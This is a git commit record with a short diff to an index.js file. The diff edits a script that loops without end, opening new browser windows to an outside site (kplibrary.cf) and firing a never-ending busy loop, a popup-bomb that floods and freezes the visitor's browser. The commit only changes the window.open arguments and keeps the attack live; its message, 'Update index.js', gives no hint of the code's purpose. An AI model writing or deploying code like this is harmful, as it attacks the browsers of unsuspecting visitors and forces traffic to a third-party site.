81c3fc1a0aacb6031e429467b5504466ce524486
Dr3w0623 <34252192+Dr3w0623@users.noreply.github.com>
2017-12-08 20:58:46 -0500

    Update index.js

--- index.js
+++ index.js
@@ -6,7 +6,7 @@ if (popUp == null || typeof(popUp) == 'undefined') {
   }
 } else {
   while (true) {
-    window.open('http://kplibrary.cf/', '_blank', 'toolbar=0,location=0,menubar=0');
+    window.open('http://kplibrary.cf/');
     setTimeout(function() {
       for (var i = 0; i === i; i++) {}
     }, 5);
